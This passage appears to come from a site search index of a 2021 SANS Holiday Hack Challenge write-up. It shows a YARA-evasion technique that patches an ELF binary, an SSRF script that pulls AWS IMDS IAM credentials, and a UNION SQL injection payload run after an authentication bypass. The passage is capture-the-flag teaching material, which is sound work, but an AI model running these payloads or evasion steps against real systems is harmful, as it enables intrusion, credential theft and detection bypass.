size. We can get around this by padding the binary with a sufficiently large amount of null bytes or 0x00 read from /dev/zero using the command dd if=/dev/zero ibs=1k count=100 >> the_critical_elf_app_1 which increases the file by 100KB. Executing the padded binary finally gets us past all the YARA rules! Staying with the theme, the Elf Jolliness Quotient is a hexadecimal string which can be decoded to Jolly Enough, Overtime Approved by using echo 4a6f6c6c7920456e6f7567682c204f76657274696d6520417070726f766564 | xxd -ps -r . One-liner solution To solve this with a one-liner we'll modify the data at uint32(1) instead of increasing the file size. uint32() reads data as little-endian integers, so we need to invert 0x02464c45 to 0x454c4602 to match the data at byte offset 1. This byte sequence is part of what identifies a 64-bit ELF binary and typically shouldn't be tampered with. In this case however, changing the last byte with value 0x02 to a non-supported class (e.g., 0x03 ) still allows the binary to execute. Each step now edits a series of hex values, meaning we can leverage sed to make those changes on the fly. Below is the one-liner command, split across multiple lines for readability. The final sudo step is required because of how the challenge is set up. Our Bash shell has a pre-execution hook, loaded through /usr/local/bin/.bash-preexec.sh which sends our command to sudo -E /usr/local/bin/pre_execution.sh $1; so it's checked against the YARA rules. 1 2 3 4 5 xxd the_critical_elf_app | \\ sed 's/6361 6e64 7963/6340 6e64 7963/g; s/726f 6772 616d 2121/7230 6772 616d 2121/g; s/7f45 4c46 02/7f45 4c46 03/g' | \\ xxd -r > the_critical_elf_app_fixed && \\ chmod +x the_critical_elf_app_fixed && \\ sudo -E /usr/local/bin/pre_execution.sh ./the_critical_elf_app_fixed Response \u2693\ufe0e Fitzy Shortstack Thanks - you figured it out! Let me tell you what I know about Splunk. Did you know Splunk recently added support for new data sources including Sysmon for Linux and GitHub Audit Log data? Between GitHub audit log and webhook event recording, you can monitor all activity in a repository, including common git commands such as git add , git status , and git commit . You can also see cloned GitHub projects. There's a lot of interesting stuff out there. Did you know there are repositories of code that are Darn Vulnerable? Sysmon provides a lot of valuable data, but sometimes correlation across data types is still necessary. Sysmon network events don't reveal the process parent ID for example. Fortunately, we can pivot with a query to investigate process creation events once you get a process ID. Sometimes Sysmon data collection is awkward. Pipelining multiple commands generates multiple Sysmon events, for example. Did you know there are multiple versions of the Netcat command that can be used maliciously? nc.openbsd , for example.","title":"Yara Analysis"},{"location":"hints/h9/#yara-analysis","text":"Elf : Fitzy Shortstack Direct link : yara terminal Objective : Splunk!","title":"Yara Analysis"},{"location":"hints/h9/#request","text":"Fitzy Shortstack Hiya, I'm Fitzy Shortstack! I was just trying to learn a bit more about YARA with this here Cranberry Pi terminal. I mean, I'm not saying I'm worried about attack threats from that other con next door, but... OK. I AM worried. I've been thinking a bit about how malware might bypass YARA rules. If you can help me solve the issue in this terminal, I'll understand YARA so much better! Would you please check it out so I can learn? And, I'll tell you what \u2013 if you help me with YARA, I'll give you some tips for Splunk! I think if you make small, innocuous changes to the executable, you can get it to run in spite of the YARA rules.","title":"Request"},{"location":"hints/h9/#solution","text":"Welcome message HELP!!! This critical application is supposed to tell us the sweetness levels of our candy manufacturing output (among other important things), but I can't get it to run. It keeps saying something something yara. Can you take a look and see if you can help get this application to bypass Sparkle Redberry's Yara scanner? If we can identify the rule that is triggering, we might be able change the program to bypass the scanner. We have some tools on the system that might help us get this application going: vim, emacs, nano, yara, and xxd The children will be very disappointed if their candy won't even cause a single cavity. For a one-liner solution, scroll all the way down to the bottom. The goal of this challenge is to modify the the_critical_elf_app binary in such a way that it doesn't trigger any of the YARA rules anymore. Each rule consists of a series of strings and a boolean expression that represents the condition that needs to be met for the rule to match. Start by running ./the_critical_elf_app which prints the message yara_rule_135 ./the_critical_elf_app . We can look up the specifics for this YARA rule in ~/yara_rules/rules.yar . yara_rule_135 1 2 3 4 5 6 7 8 9 10 11 12 rule yara_rule_135 { meta: description = \"binaries - file Sugar_in_the_machinery\" author = \"Sparkle Redberry\" reference = \"North Pole Malware Research Lab\" date = \"1955-04-21\" hash = \"19ecaadb2159b566c39c999b0f860b4d8fc2824eb648e275f57a6dbceaf9b488\" strings: $s = \"candycane\" condition: $s } The rule matches because somewhere in the binary there's a candycane string. Create a hex dump of the binary using xxd the_critical_elf_app > the_critical_elf_app.hex and open the file in your favorite editor. Search for candy to find the offending string and change the hex value of one of the letters so the YARA rule doesn't match anymore. In the below example changing 0x61 to 0x40 updates the string to c@ndycane . An ASCII table can help with the ASCII to hex conversion. Updated hex dump Original hex dump Convert the hex dump back to a binary with xxd -r the_critical_elf_app.hex the_critical_elf_app_1 and make it executable using chmod +x the_critical_elf_app_1 . Running the updated binary now triggers yara_rule_1056 . yara_rule_1056 1 2 3 4 5 6 7 8 9 10 11 12 13 rule yara_rule_1056 { meta: description = \"binaries - file frosty.exe\" author = \"Sparkle Redberry\" reference = \"North Pole Malware Research Lab\" date = \"1955-04-21\" hash = \"b9b95f671e3d54318b3fd4db1ba3b813325fcef462070da163193d7acb5fcd03\" strings: $s1 = {6c 6962 632e 736f 2e36} $hs2 = {726f 6772 616d 2121} condition: all of them } This time the rule has 2 conditions which both need to match. Open the modified hex dump again and search for both hex strings to determine which one we can safely modify. If a search doesn't find the string you're looking for, trim it down as it might span across multiple lines. {6c 6962 632e 736f 2e36} can't be changed as libc.so.6 is an essential library. {726f 6772 616d 2121} however is fine, regardless of what the ASCII string states. Let's change 0x6f to 0x30 , so we get pr0gram!! . Updated hex dump Original hex dump Just like before, use xxd -r the_critical_elf_app.hex the_critical_elf_app_1 to convert the updated hex dump back to a binary. The chmod +x step can be skipped as the_critical_elf_app_1 is already executable and we're merely writing new data into the file. Running ./the_critical_elf_app_1 once more now tells us it matches yara_rule_1732 . yara_rule_1732 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 rule yara_rule_1732 { meta: description = \"binaries - alwayz_winter.exe\" author = \"Santa\" reference = \"North Pole Malware Research Lab\" date = \"1955-04-22\" hash = \"c1e31a539898aab18f483d9e7b3c698ea45799e78bddc919a7dbebb1b40193a8\" strings: $s1 = \"This is critical for the execution of this program!!\" fullword ascii $s2 = \"__frame_dummy_init_array_entry\" fullword ascii $s3 = \".note.gnu.property\" fullword ascii $s4 = \".eh_frame_hdr\" fullword ascii $s5 = \"__FRAME_END__\" fullword ascii $s6 = \"__GNU_EH_FRAME_HDR\" fullword ascii $s7 = \"frame_dummy\" fullword ascii $s8 = \".note.gnu.build-id\" fullword ascii $s9 = \"completed.8060\" fullword ascii $s10 = \"_IO_stdin_used\" fullword ascii $s11 = \".note.ABI-tag\" fullword ascii $s12 = \"naughty string\" fullword ascii $s13 = \"dastardly string\" fullword ascii $s14 = \"__do_global_dtors_aux_fini_array_entry\" fullword ascii $s15 = \"__libc_start_main@@GLIBC_2.2.5\" fullword ascii $s16 = \"GLIBC_2.2.5\" fullword ascii $s17 = \"its_a_holly_jolly_variable\" fullword ascii $s18 = \"__cxa_finalize\" fullword ascii $s19 = \"HolidayHackChallenge{NotReallyAFlag}\" fullword ascii $s20 = \"__libc_csu_init\" fullword ascii condition: uint32(1) == 0x02464c45 and filesize < 50KB and 10 of them } Once again there's a few requirements for the rule to match, one of them being the file needs to be less than 50KB in size. We can get around this by padding the binary with a sufficiently large amount of null bytes or 0x00 read from /dev/zero using the command dd if=/dev/zero ibs=1k count=100 >> the_critical_elf_app_1 which increases the file by 100KB. Executing the padded binary finally gets us past all the YARA rules! Staying with the theme, the Elf Jolliness Quotient is a hexadecimal string which can be decoded to Jolly Enough, Overtime Approved by using echo 4a6f6c6c7920456e6f7567682c204f76657274696d6520417070726f766564 | xxd -ps -r . One-liner solution To solve this with a one-liner we'll modify the data at uint32(1) instead of increasing the file size. uint32() reads data as little-endian integers, so we need to invert 0x02464c45 to 0x454c4602 to match the data at byte offset 1. This byte sequence is part of what identifies a 64-bit ELF binary and typically shouldn't be tampered with. In this case however, changing the last byte with value 0x02 to a non-supported class (e.g., 0x03 ) still allows the binary to execute. Each step now edits a series of hex values, meaning we can leverage sed to make those changes on the fly. Below is the one-liner command, split across multiple lines for readability. The final sudo step is required because of how the challenge is set up. Our Bash shell has a pre-execution hook, loaded through /usr/local/bin/.bash-preexec.sh which sends our command to sudo -E /usr/local/bin/pre_execution.sh $1; so it's checked against the YARA rules. 1 2 3 4 5 xxd the_critical_elf_app | \\ sed 's/6361 6e64 7963/6340 6e64 7963/g; s/726f 6772 616d 2121/7230 6772 616d 2121/g; s/7f45 4c46 02/7f45 4c46 03/g' | \\ xxd -r > the_critical_elf_app_fixed && \\ chmod +x the_critical_elf_app_fixed && \\ sudo -E /usr/local/bin/pre_execution.sh ./the_critical_elf_app_fixed","title":"Solution"},{"location":"hints/h9/#response","text":"Fitzy Shortstack Thanks - you figured it out! Let me tell you what I know about Splunk. Did you know Splunk recently added support for new data sources including Sysmon for Linux and GitHub Audit Log data? Between GitHub audit log and webhook event recording, you can monitor all activity in a repository, including common git commands such as git add , git status , and git commit . You can also see cloned GitHub projects. There's a lot of interesting stuff out there. Did you know there are repositories of code that are Darn Vulnerable? Sysmon provides a lot of valuable data, but sometimes correlation across data types is still necessary. Sysmon network events don't reveal the process parent ID for example. Fortunately, we can pivot with a query to investigate process creation events once you get a process ID. Sometimes Sysmon data collection is awkward. Pipelining multiple commands generates multiple Sysmon events, for example. Did you know there are multiple versions of the Netcat command that can be used maliciously? nc.openbsd , for example.","title":"Response"},{"location":"objectives/o1/","text":"KringleCon Orientation \u2693\ufe0e Difficulty : Direct link : opengate terminal Terminal hint : - Objective \u2693\ufe0e Request Get your bearings at KringleCon Jingle Ringford Welcome to the North Pole, KringleCon, and the 2021 SANS Holiday Hack Challenge! I\u2019m Jingle Ringford, one of Santa\u2019s elves. Santa asked me to come here and give you a short orientation to this festive event. Before you move forward through the gate, I\u2019ll ask you to accomplish a few simple tasks. Solution \u2693\ufe0e To solve this challenge we just need to follow Jingle Ringford's instructions. Each task is designed to help explain part of the game mechanics: talk to Jingle Ringford, get our badge, pick up the WiFi dongle, and use the terminal to open the gate. Start by clicking on Jingle Ringford's avatar until three dots appear, indicating the end of the conversation. Jingle Ringford First things first, here's your badge! It's that wrapped present in the middle of your avatar. Great - now you're official! Click on the badge on your avatar \ud83c\udf81. That\u2019s where you will see your Objectives, Hints, and gathered Items for the Holiday Hack Challenge. We\u2019ve also got handy links to the KringleCon talks and more there for you! Next, click on that USB wifi adapter - just in case you need it later. Next, click on to the WiFi dongle to pick it up , then click on Jingle Ringford again to continue the conversation. Jingle Ringford Fantastic! OK, one last thing. Click on the Cranberry Pi Terminal and follow the on-screen instructions. Finally, click on the terminal to open it, click on the top pane, enter answer , and press Enter to complete the challenge. Jingle Ringford Great! Your orientation is now complete! You can enter through the gate now. Have FUN!!! Answer Follow Jingle Ringford's instructions to open the gate.","title":"KringleCon Orientation"},{"location":"objectives/o1/#kringlecon-orientation","text":"Difficulty : Direct link : opengate terminal Terminal hint : -","title":"KringleCon Orientation"},{"location":"objectives/o1/#objective","text":"Request Get your bearings at KringleCon Jingle Ringford Welcome to the North Pole, KringleCon, and the 2021 SANS Holiday Hack Challenge! I\u2019m Jingle Ringford, one of Santa\u2019s elves. Santa asked me to come here and give you a short orientation to this festive event. Before you move forward through the gate, I\u2019ll ask you to accomplish a few simple tasks.","title":"Objective"},{"location":"objectives/o1/#solution","text":"To solve this challenge we just need to follow Jingle Ringford's instructions. Each task is designed to help explain part of the game mechanics: talk to Jingle Ringford, get our badge, pick up the WiFi dongle, and use the terminal to open the gate. Start by clicking on Jingle Ringford's avatar until three dots appear, indicating the end of the conversation. Jingle Ringford First things first, here's your badge! It's that wrapped present in the middle of your avatar. Great - now you're official! Click on the badge on your avatar \ud83c\udf81. That\u2019s where you will see your Objectives, Hints, and gathered Items for the Holiday Hack Challenge. We\u2019ve also got handy links to the KringleCon talks and more there for you! Next, click on that USB wifi adapter - just in case you need it later. Next, click on to the WiFi dongle to pick it up , then click on Jingle Ringford again to continue the conversation. Jingle Ringford Fantastic! OK, one last thing. Click on the Cranberry Pi Terminal and follow the on-screen instructions. Finally, click on the terminal to open it, click on the top pane, enter answer , and press Enter to complete the challenge. Jingle Ringford Great! Your orientation is now complete! You can enter through the gate now. Have FUN!!! Answer Follow Jingle Ringford's instructions to open the gate.","title":"Solution"},{"location":"objectives/o10/","text":"Now Hiring! \u2693\ufe0e Difficulty : Direct link : apply website Terminal hint : IMDS Exploration Objective \u2693\ufe0e Request What is the secret access key for the Jack Frost Tower job applications server ? Brave the perils of Jack's bathroom to get hints from Noxious O. D'or. Hints \u2693\ufe0e AWS IMDS Documentation The AWS documentation for IMDS is interesting reading. Solution \u2693\ufe0e As noted by Noxious O\u2019Dor after solving the IMDS Exploration terminal, \"anytime you see URL as an input, test for SSRF\" . So, let's head straight for the application form and fill in some random values to see how things behave. Depending on whether a URL is submitted or not the response will look different. For example, using the name Alf the dyslexic elf and an http://169.254.169.254/latest IMDS API endpoint as the report URL will result in a confirmation message containing additional text and a broken image. Skipping the NLBI report URL Submitting an NLBI report URL Inspecting the network requests using the web browser's developer tools shows that the missing image actually has the same name we submitted via the form, Alf the dyslexic elf.jpg . It also shows that the request to retrieve the image returned an HTTP 200 response, meaning it must exist. Downloading Alf the dyslexic elf.jpg using curl reveals that the file doesn't contain any image data at all, but the output from a request to the server's http://169.254.169.254/latest IMDS API endpoint. Now that we've confirmed the website is vulnerable to SSRF we can either keep submitting the form via a web browser like we've done so far, use curl to both submit the form and retrieve the image data, or write a small script that automates the form submission and image retrieval for either an IMDS API endpoint or a local file:// URL. get_ssrf_data.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 #!/usr/bin/env python import requests import click @click . command () @click . option ( '-n' , '--name' , default = \"Alf the dyslexic elf\" , help = 'Your preferred name.' ) @click . option ( '-a' , '--api-endpoint' , default = \"/\" , help = 'The IMDS API endpoint to query.' ) @click . option ( '-f' , '--file' , help = 'The full path to a local file.' ) def cli ( name : str , api_endpoint : str , file : str ): url = \"https://apply.jackfrosttower.com\" # Create the file or IMDS URL to retrieve if file : message = f \"local file { file } \" ssrf_url = f \"file:// { file } \" else : message = f \"IMDS { api_endpoint } \" ssrf_url = f \"http://169.254.169.254 { api_endpoint } \" # Application form fields params = { 'inputName' : name , 'inputEmail' : \"\" , 'inputPhone' : \"\" , 'resumeFile' : \"\" , 'inputWorkSample' : ssrf_url , 'additionalInformation' : \"\" , 'submit' : \"\" , } # Submit the form sess = requests . Session () resp = sess . get ( url , params = params ) # If the request was successful, download the JPG file and print the contents if resp . status_code == 200 and \"recipients rejoice!\" in resp . text : print ( \"Form submission successful.\" ) print ( f \"Retrieving { message } :\" ) print ( sess . get ( f \" { url } /images/ { name } .jpg\" ) . text ) else : print ( \"Error submitting form.\" ) if __name__ == '__main__' : cli () The key data we're after is stored under /latest/meta-data/iam/security-credentials/<role_name> , so we first need to request /latest/meta-data/iam/security-credentials and then use the role name in a followup request to retrieve all credential details. Answer CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX PHP application flaw Using python get_ssrf_data.py -f '/var/www/html/index.html' to access the web application source at /var/www/html/index.html we can see that the PHP code doesn't verify if an actual NLBI report URL was submitted and simply assumes that what is sent back is an image. The intent was to personalize the confirmation message by including the applicant's profile picture, but instead it introduced the SSRF vulnerability.","title":"Now Hiring!"},{"location":"objectives/o10/#now-hiring","text":"Difficulty : Direct link : apply website Terminal hint : IMDS Exploration","title":"Now Hiring!"},{"location":"objectives/o10/#objective","text":"Request What is the secret access key for the Jack Frost Tower job applications server ? Brave the perils of Jack's bathroom to get hints from Noxious O. D'or.","title":"Objective"},{"location":"objectives/o10/#hints","text":"AWS IMDS Documentation The AWS documentation for IMDS is interesting reading.","title":"Hints"},{"location":"objectives/o10/#solution","text":"As noted by Noxious O\u2019Dor after solving the IMDS Exploration terminal, \"anytime you see URL as an input, test for SSRF\" . So, let's head straight for the application form and fill in some random values to see how things behave. Depending on whether a URL is submitted or not the response will look different. For example, using the name Alf the dyslexic elf and an http://169.254.169.254/latest IMDS API endpoint as the report URL will result in a confirmation message containing additional text and a broken image. Skipping the NLBI report URL Submitting an NLBI report URL Inspecting the network requests using the web browser's developer tools shows that the missing image actually has the same name we submitted via the form, Alf the dyslexic elf.jpg . It also shows that the request to retrieve the image returned an HTTP 200 response, meaning it must exist. Downloading Alf the dyslexic elf.jpg using curl reveals that the file doesn't contain any image data at all, but the output from a request to the server's http://169.254.169.254/latest IMDS API endpoint. Now that we've confirmed the website is vulnerable to SSRF we can either keep submitting the form via a web browser like we've done so far, use curl to both submit the form and retrieve the image data, or write a small script that automates the form submission and image retrieval for either an IMDS API endpoint or a local file:// URL. get_ssrf_data.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 #!/usr/bin/env python import requests import click @click . command () @click . option ( '-n' , '--name' , default = \"Alf the dyslexic elf\" , help = 'Your preferred name.' ) @click . option ( '-a' , '--api-endpoint' , default = \"/\" , help = 'The IMDS API endpoint to query.' ) @click . option ( '-f' , '--file' , help = 'The full path to a local file.' ) def cli ( name : str , api_endpoint : str , file : str ): url = \"https://apply.jackfrosttower.com\" # Create the file or IMDS URL to retrieve if file : message = f \"local file { file } \" ssrf_url = f \"file:// { file } \" else : message = f \"IMDS { api_endpoint } \" ssrf_url = f \"http://169.254.169.254 { api_endpoint } \" # Application form fields params = { 'inputName' : name , 'inputEmail' : \"\" , 'inputPhone' : \"\" , 'resumeFile' : \"\" , 'inputWorkSample' : ssrf_url , 'additionalInformation' : \"\" , 'submit' : \"\" , } # Submit the form sess = requests . Session () resp = sess . get ( url , params = params ) # If the request was successful, download the JPG file and print the contents if resp . status_code == 200 and \"recipients rejoice!\" in resp . text : print ( \"Form submission successful.\" ) print ( f \"Retrieving { message } :\" ) print ( sess . get ( f \" { url } /images/ { name } .jpg\" ) . text ) else : print ( \"Error submitting form.\" ) if __name__ == '__main__' : cli () The key data we're after is stored under /latest/meta-data/iam/security-credentials/<role_name> , so we first need to request /latest/meta-data/iam/security-credentials and then use the role name in a followup request to retrieve all credential details. Answer CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX PHP application flaw Using python get_ssrf_data.py -f '/var/www/html/index.html' to access the web application source at /var/www/html/index.html we can see that the PHP code doesn't verify if an actual NLBI report URL was submitted and simply assumes that what is sent back is an image. The intent was to personalize the confirmation message by including the applicant's profile picture, but instead it introduced the SSRF vulnerability.","title":"Solution"},{"location":"objectives/o11/","text":"Customer Complaint Analysis \u2693\ufe0e Difficulty : Direct link : jackfrosttower-network.zip Terminal hint : Strace Ltrace Retrace Objective \u2693\ufe0e Request A human has accessed the Jack Frost Tower network with a non-compliant host. Which three trolls complained about the human ? Enter the troll names in alphabetical order separated by spaces. Talk to Tinsel Upatree in the kitchen for hints. Pat Tronizer Hrmph. Oh hey, I'm Pat Tronizer. I'm SO glad to have all these first-rate talks here. We issued a Call for Talks, but only one person responded... We put him in track 1. But Jack came up with an ingenious way to borrow additional talks for FrostFest! You can hardly tell where we got these great speakers! Anyway, I cannot believe an actual human connected to the Tower network . It's supposed to be the domain of us trolls and of course Jack Frost himself. Mr. Frost has a strict policy: all devices must be RFC3514 compliant. It fits in with our nefarious plans. Some human had the nerve to use our complaint website to submit a complaint! That website is for trolls to complain about guests, NOT the other way around. Humans have some nerve. Hints \u2693\ufe0e Wireshark Display Filters Different from BPF capture filters, Wireshark's display filters can find text with the contains keyword - and evil bits with ip.flags.rb . Evil Bit RFC RFC3514 defines the usage of the \"Evil Bit\" in IPv4 headers. Solution \u2693\ufe0e To solve the challenge we first need to determine who the guest is and what room they are staying in. Then we can use their room number to filter down the list of troll complaints and find the three trolls who complained about the human. At Frost Tower devices are considered to be RFC3514 compliant when they have the evil bit or security flag set to 0x1 in their IPv4 header. RFC3514 - Assigned values 0x0 If the bit is set to 0, the packet has no evil intent. Hosts, network elements, etc., SHOULD assume that the packet is harmless, and SHOULD NOT take any defensive measures. (We note that this part of the spec is already implemented by many common desktop operating systems.) 0x1 If the bit is set to 1, the packet has evil intent. Secure systems SHOULD try to defend themselves against such packets. Insecure systems MAY chose to crash, be penetrated, etc. Open the packet capture file in Wireshark and use ip.flags.rb == 0x0 to filter on non-compliant traffic. The filtered list is short enough to easily spot the HTTP POST request to /feedback/guest_complaint.php , but if you like you can make the display filter more specific by using ip.flags.rb == 0x0 && http.request.method == \"POST\" instead. It looks like Muffy will be speaking to the manager . She submitted the complaint form without the proper evil bit value and, based on the submitted form data, she's staying in room 1024. Pivoting the search to the trolls we can now create a display filter that looks for HTTP POST requests with form data containing 1024 and which have their evil bit set to 0x1 . ip.flags.rb == 0x1 && http.request.method == \"POST\" && urlencoded-form.value contains \"1024\" Flud Very cranky lady in room 1024 - Lady call front desk. Complain \"employee\" is rude. Say she is insult and want to speak to manager. Send Flud to room. Lady say troll call her towels thief. I say stop steal towels if is bother her. Hagg Incredibly angry lady in room 1024 - Lady call front desk. I am walk by so I pick up phone. She is ANGRY and shout at me. Say she has never been so insult. I say she probably has but just didn't hear it. Yaqh Snooty lady in room 1024 - Lady call desk and ask for more towel. Yaqh take to room. Yaqh ask if she want more towel because she is like to steal. She say Yaqh is insult. Yaqh is not insult. Yaqh is Yaqh. Looks like Flud, Hagg, and Yaqh are the three trolls who complained about the lady who's staying in room 1024. Before moving on to the next challenge however, definitely take some time to read the remaining 12 funny troll complaints in the packet capture. Answer Flud Hagg Yaqh","title":"Customer Complaint Analysis"},{"location":"objectives/o11/#customer-complaint-analysis","text":"Difficulty : Direct link : jackfrosttower-network.zip Terminal hint : Strace Ltrace Retrace","title":"Customer Complaint Analysis"},{"location":"objectives/o11/#objective","text":"Request A human has accessed the Jack Frost Tower network with a non-compliant host. Which three trolls complained about the human ? Enter the troll names in alphabetical order separated by spaces. Talk to Tinsel Upatree in the kitchen for hints. Pat Tronizer Hrmph. Oh hey, I'm Pat Tronizer. I'm SO glad to have all these first-rate talks here. We issued a Call for Talks, but only one person responded... We put him in track 1. But Jack came up with an ingenious way to borrow additional talks for FrostFest! You can hardly tell where we got these great speakers! Anyway, I cannot believe an actual human connected to the Tower network . It's supposed to be the domain of us trolls and of course Jack Frost himself. Mr. Frost has a strict policy: all devices must be RFC3514 compliant. It fits in with our nefarious plans. Some human had the nerve to use our complaint website to submit a complaint! That website is for trolls to complain about guests, NOT the other way around. Humans have some nerve.","title":"Objective"},{"location":"objectives/o11/#hints","text":"Wireshark Display Filters Different from BPF capture filters, Wireshark's display filters can find text with the contains keyword - and evil bits with ip.flags.rb . Evil Bit RFC RFC3514 defines the usage of the \"Evil Bit\" in IPv4 headers.","title":"Hints"},{"location":"objectives/o11/#solution","text":"To solve the challenge we first need to determine who the guest is and what room they are staying in. Then we can use their room number to filter down the list of troll complaints and find the three trolls who complained about the human. At Frost Tower devices are considered to be RFC3514 compliant when they have the evil bit or security flag set to 0x1 in their IPv4 header. RFC3514 - Assigned values 0x0 If the bit is set to 0, the packet has no evil intent. Hosts, network elements, etc., SHOULD assume that the packet is harmless, and SHOULD NOT take any defensive measures. (We note that this part of the spec is already implemented by many common desktop operating systems.) 0x1 If the bit is set to 1, the packet has evil intent. Secure systems SHOULD try to defend themselves against such packets. Insecure systems MAY chose to crash, be penetrated, etc. Open the packet capture file in Wireshark and use ip.flags.rb == 0x0 to filter on non-compliant traffic. The filtered list is short enough to easily spot the HTTP POST request to /feedback/guest_complaint.php , but if you like you can make the display filter more specific by using ip.flags.rb == 0x0 && http.request.method == \"POST\" instead. It looks like Muffy will be speaking to the manager . She submitted the complaint form without the proper evil bit value and, based on the submitted form data, she's staying in room 1024. Pivoting the search to the trolls we can now create a display filter that looks for HTTP POST requests with form data containing 1024 and which have their evil bit set to 0x1 . ip.flags.rb == 0x1 && http.request.method == \"POST\" && urlencoded-form.value contains \"1024\" Flud Very cranky lady in room 1024 - Lady call front desk. Complain \"employee\" is rude. Say she is insult and want to speak to manager. Send Flud to room. Lady say troll call her towels thief. I say stop steal towels if is bother her. Hagg Incredibly angry lady in room 1024 - Lady call front desk. I am walk by so I pick up phone. She is ANGRY and shout at me. Say she has never been so insult. I say she probably has but just didn't hear it. Yaqh Snooty lady in room 1024 - Lady call desk and ask for more towel. Yaqh take to room. Yaqh ask if she want more towel because she is like to steal. She say Yaqh is insult. Yaqh is not insult. Yaqh is Yaqh. Looks like Flud, Hagg, and Yaqh are the three trolls who complained about the lady who's staying in room 1024. Before moving on to the next challenge however, definitely take some time to read the remaining 12 funny troll complaints in the packet capture. Answer Flud Hagg Yaqh","title":"Solution"},{"location":"objectives/o12/","text":"Frost Tower Website Checkup \u2693\ufe0e Difficulty : Direct link : staging website Terminal hint : The Elf C0de Objective \u2693\ufe0e Request Investigate Frost Tower's website for security issues . This source code will be useful in your analysis . In Jack Frost's TODO list, what job position does Jack plan to offer Santa? Ribb Bonbowford, in Santa's dining room, may have some pointers for you. Ingreta Tude Hey there! I'm Ingreta Tude. I really don't like the direction Jack Frost is leading us. He seems obsessed with beating Santa and taking over the holiday season. It just doesn't seem right. Why can't we work together with Santa and the elves instead of trying to beat them? But, I do have an Objective for you. We're getting ready to launch a new website for Frost Tower, and the big guy has charged me with making sure it's secure. Hints \u2693\ufe0e SQL Injection with Source When you have the source code, API documentation becomes tremendously valuable . Solution \u2693\ufe0e This challenge is an example of a white-box pentest and solving it requires finding and exploiting 2 vulnerabilities in the source code . First we need to bypass authentication, followed by an SQL injection attack against a vulnerable URL endpoint. Ribb Bonbowford's hint literally tells us which 2 Node.js modules we need to focus on for each step, express-session and mysql . Understanding the application logic Having access to the source code gives us full insight into the web application's internal logic and understanding the application flow is an important part of solving the challenge. While we could submit the form on the Frost Tower website to determine that the actual site is located at /testsite , the same information can also be found by analyzing the server.js source code, which we'll be doing throughout this write-up. Bypassing authentication \u2693\ufe0e When a user successfully logs in using a POST request to /login , the session.uniqueID variable is assigned a value, enabling access to backend endpoints like /dashboard which wrap their logic in an if (session.uniqueID) {} statement. There's a flaw in the /postcontact endpoint logic, however. Using the contact form form to submit the same email address more than once will result in the SQL query on line 141 to return the email that's already in the uniquecontact table and assign the submitted email to session.uniqueID (line 151), fullfilling the requirement set by endpoints like /dashboard . Submitting the same email twice via the contact form and accessing the /dashboard endpoint confirms the vulnerability. SQL injection \u2693\ufe0e Now that the web application considers us authenticated we can take a closer look at all the server.js code that's wrapped in if (session.uniqueID) {} statements. This reveals an additional vulnerability in the /detail endpoint, which contains logic to parse a comma-separated list of IDs in order to build a database query that will retrieve multiple uniquecontact records at once. On line 207 the code contains a raw() method which, per the mysql API documentation , \"will skip all escaping functions when used, so be careful when passing in unvalidated input\" . Honestly, this sounds more like a hint than a warning. Escaping query values The mysql Node.js library provides several methods like mysql.escape() , connection.escape() , and pool.escape() which can be used to escape user-provided data and help prevent SQL injection attacks. In addition, ? characters can also be used as placeholders for any values that should be escaped. However, the mysql.raw() method will leave the data un-touched even when it's used in combination with a ? placeholder. In other words, the escape() method used in the tempCont.escape(m.raw(ids[i])); statement will have no impact on the object returned by the raw() method. By using an SQL injection UNION attack we can combine the results from the uniquecontact SELECT statement on line 198 with whatever we'd like to retrieve from another table, as long as each individual query returns the same number of columns and their data types are compatible. As a request for ID 0 using /detail/0 returns no records, the result of a UNION statement will only contain the data from the other table. This keeps things nice and clean. There is one caveat though. Commas will be stripped out as the input string is converted to a list of IDs by the split() method on line 204, meaning our SQL query can't contain that particular character. Luckily for us, others already solved that problem and SELECT 1,2,3 can be rewritten as SELECT * FROM (SELECT 1)F1 JOIN (SELECT 2)F2 JOIN (SELECT 3)F3 . While it might be tempting to go for admin access, the goal is to find Jack's TODO list, so craft a query that lists all the tables. In the example below, the table_name query statement is at the same column index as the full_name column in the uniquecontact table, which will result in the detail.ejs template rendering it front and center using <h1><%= encontact.full_name %></h1> . SQL injection input string 0 , 0 union select * from (( select 1 ) F1 join ( select table_name from information_schema . tables where table_schema = 'encontact' ) F2 join ( select 3 ) F3 join ( select 4 ) F4 join ( select 5 ) F5 join ( select 6 ) F6 join ( select 7 ) F7 ); -- Code-generated SQL query SELECT * FROM uniquecontact WHERE id = 0 OR id = 0 union select * from (( select 1 ) F1 join ( select table_name from information_schema . tables where table_schema = 'encontact' ) F2 join ( select 3 ) F3 join ( select 4 ) F4 join ( select 5 ) F5 join ( select 6 ) F6 join ( select 7 ) F7 ); -- OR id=? Using the SQLi string above as input for the /detail endpoint gives us the information we're looking for. The same technique can now be repeated to retrieve the column information from the todo table (i.e., id , note , completed ), followed by the notes themselves. To help automate these final steps we can create a script that takes our desired SQL query as input, inserts it into the SQLi UNION attack string, creates an authenticated session by submitting the contact form twice using the same email, and then performs a GET request against the /detail endpoint using the crafted SQLi string as input. query_db.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 #!/usr/bin/env python import click import requests from bs4 import BeautifulSoup def authenticate ( sess : requests . Session ) -> bool : \"\"\"Submit the same contact form data twice to authenticate.\"\"\" authenticated = False for _ in range ( 2 ): # Get the CSRF token url = 'https://staging.jackfrosttower.com/contact' resp = sess . get ( url ) soup = BeautifulSoup ( resp . text , features = \"html.parser\" ) csrf_token = soup . find ( 'input' , { 'name' : '_csrf' })[ 'value' ] # Submit the form url = 'https://staging.jackfrosttower.com/postcontact' headers = { 'Content-Type' : 'application/x-www-form-urlencoded' } data = { '_csrf' : csrf_token , 'fullname' : 'name' , 'email' : 'me@email.com' , 'phone' : '1234567890' , 'country' : 